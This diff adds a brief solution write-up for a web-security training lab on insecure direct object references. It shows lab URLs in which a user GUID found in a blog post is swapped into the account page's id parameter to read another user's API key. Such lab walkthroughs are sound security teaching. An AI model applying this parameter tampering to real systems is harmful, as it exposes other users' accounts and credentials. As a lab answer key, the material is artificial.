@@ -1,3 +1,12 @@
-Lab #08
+Lab #08: User ID controlled by request parameter, with unpredictable user IDs 
 
-Incomplete
+1. The userid is not predictable. A blog post reveals the user id of the author. 
+https://0a3b00210351ccd68169d0840043001c.web-security-academy.net/blogs?userId=10b6471a-ff10-4565-aeee-595ebc585116
+
+2. Copy the userid and place it into the url by replacing the userid of wiener user.
+https://0a3b00210351ccd68169d0840043001c.web-security-academy.net/my-account?id=10b6471a-ff10-4565-aeee-595ebc585116
+10b6471a-ff10-4565-aeee-595ebc585116
+
+3. Submit the api key in the solution
+
+
